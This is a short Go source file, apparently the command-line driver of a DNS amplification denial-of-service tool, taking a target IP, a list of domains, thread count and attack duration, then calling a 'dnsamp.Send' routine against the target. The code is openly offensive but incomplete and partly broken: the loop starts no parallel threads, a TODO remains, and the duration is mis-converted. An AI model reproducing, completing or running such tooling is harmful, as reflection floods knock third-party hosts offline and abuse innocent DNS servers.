package main

import (
	"dnsamp/dnsamp"
	"flag"
	"net"
	"time"
)

// CLI arguments
var targetIP = flag.String("target_ip", "", "The IP address of the target of the attack")
var filename = flag.String("filename", "domains.csv", "A csv file with domain names")
var numThreads = flag.Int("num_threads", 1, "The number of threads to run in parallel")
var duration = flag.Int("duration", 1, "The duration of the attack in seconds")


func main() {
    flag.Parse()
    target := net.ParseIP(*targetIP)

    servers := dnsamp.ReadFile(*filename)

    // Start threads
    for i:=0; i<*numThreads; i++ {
        // TODO: slice servers per thread
        dnsamp.Send(target, servers)
    }
    // Wait for duration in seconds, then stop attack
    time.Sleep(time.Duration(*duration))
}

